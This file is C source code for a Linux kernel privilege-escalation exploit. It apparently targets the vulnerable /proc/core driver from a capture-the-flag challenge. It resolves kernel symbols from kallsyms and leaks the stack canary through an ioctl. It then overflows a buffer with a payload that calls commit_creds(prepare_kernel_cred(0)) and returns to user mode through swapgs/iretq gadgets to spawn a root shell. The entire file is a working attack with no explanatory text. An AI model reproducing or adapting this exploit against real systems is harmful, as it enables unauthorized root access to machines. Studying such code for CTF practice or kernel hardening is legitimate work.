#include<stdio.h>
#include<sys/types.h>
#include<sys/stat.h>
#include<fcntl.h>


size_t commit_creds = 0, prepare_kernel_cred = 0;

//cat /sys/module/core/sections/.text
//init: setsid /bin/cttyhack setuidgid 0 /bin/sh
size_t raw_vmlinux_base = 0xffffffff81000000;
size_t vmlinux_base = 0;


size_t user_cs,user_ss,user_rflags,user_sp;
void save_status(){
   __asm__("mov user_cs,cs;"
           "mov user_ss,ss;"
           "mov user_sp,rsp;"
           "pushf;"            //push eflags
           "pop user_rflags;"
          );
}


size_t find_symbols(){
   FILE* kallsyms_fd = fopen("/tmp/kallsyms","r");
   if(kallsyms_fd < 0){
      puts("[*]open kallsyms error!");
      exit(0);
   }

   char buf[0x30] = {0};
   while(fgets(buf,0x30,kallsyms_fd)){
      if(commit_creds & prepare_kernel_cred)
         return 0;
      //find commit_creds
      if(strstr(buf,"commit_creds") && !commit_creds){
         char hex[20] = {0};
         strncpy(hex,buf,16);
         sscanf(hex,"%llx",&commit_creds);
         printf("commit_creds addr: %p\n",commit_creds);
         
         vmlinux_base = commit_creds - 0x9c8e0;
         printf("vmlinux_base addr: %p\n",vmlinux_base);
      }

      //find prepare_kernel_cred
      if(strstr(buf,"prepare_kernel_cred") && !prepare_kernel_cred){
         char hex[20] = {0};
         strncpy(hex,buf,16);
         sscanf(hex,"%llx",&prepare_kernel_cred);
         printf("prepare_kernel_cred addr: %p\n",prepare_kernel_cred);
         vmlinux_base = prepare_kernel_cred - 0x9cce0;
      }

   }

   if(!commit_creds & !prepare_kernel_cred){
      puts("[*]read kallsyms error!");
      exit(0);
   }
}


void spawn_shell(){
   if(!getuid()){
      system("/bin/sh");
   }
   else{
      puts("[*]spawn shell error!");
   }
   exit(0);
}


void get_root(){
    char* (*pkc)(int) = prepare_kernel_cred;
    void (*cc)(char*) = commit_creds;
    (*cc)((*pkc)(0));
}


int main(){
    save_status(); 

    int fd = open("/proc/core", 2);
    if(fd < 0){
        puts("[*]open /proc/core error!");
    }
   
    //read /tmp/kallsyms to get commit_creds and prepare_kernel_cred addr
    find_symbols();
    ssize_t offset = vmlinux_base - raw_vmlinux_base;
   
    //v5 [rbp-0x50]
    //leak canary
    ioctl(fd, 0x6677889C, 0x40);

    char buf[0x40] = {0};
    ioctl(fd, 0x6677889B, buf);
    size_t canary = ((size_t*)buf)[0];
    printf("[*]canary: %p\n", canary);


    

    size_t rop[0x1000] = {0};   
    int i;
    
    //rbp-0x50
    for(i=0; i<10; i++){ 
        rop[i] = canary;
    }


    //commit_creds(prepare_kernel_cred(0))
    //rdi = 0;ret prepare_kernel_cred
    //prepare_kernel_cred(0)
    rop[i++] = get_root;
    
    
    //kernel space to user spcace :swapgs iretq
    //swapgs: get kernel data structure
    //popfq:pop eflags
    //retn iretq
    rop[i++] = 0xffffffff81a012da + offset; //swapgs; popfq; ret
    rop[i++] = 0;
    
    //iretq:from kernel space to user space
    //prepare cs,eflags.rsp,
    rop[i++] = 0xffffffff81050ac2 + offset; //iretq; ret
    
    
    rop[i++] = (size_t)spawn_shell; //rip

    rop[i++] = user_cs;
    rop[i++] = user_rflags;
    rop[i++] = user_sp;
    rop[i++] = user_ss;

    
    write(fd,rop,0x800);
    ioctl(fd, 0x6677889A, 0xffffffffffff0000 | (0x100));

   
    return 0;
}